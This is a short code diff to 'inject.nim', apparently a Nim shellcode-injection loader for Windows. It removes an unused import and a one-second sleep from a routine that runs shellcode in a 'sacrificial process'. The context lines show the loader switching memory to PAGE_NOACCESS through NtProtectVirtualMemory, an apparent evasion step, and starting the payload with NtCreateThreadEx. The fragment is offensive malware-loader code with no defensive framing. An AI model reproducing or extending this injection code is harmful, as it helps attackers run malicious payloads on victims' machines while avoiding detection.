@@ -9,7 +9,6 @@
         nim c -d=release -d=danger -d=strip --opt=size -d=mingw --app=console --cpu=amd64 --out=app.exe inject.nim
 ]#
 
-import os
 import osproc
 import winim/lean
 
@@ -55,9 +54,6 @@ proc execute(name: string, shellcode: openarray[byte]): void =
     # Change back memory page permissions
     NtProtectVirtualMemory(pHandle, rPtr, addr shellLen, PAGE_NOACCESS, addr op)
 
-    # Wait a bit...
-    sleep(1000)
-    
     # Create main thread of sacrificial process
     NtCreateThreadEx(
         addr tHandle,
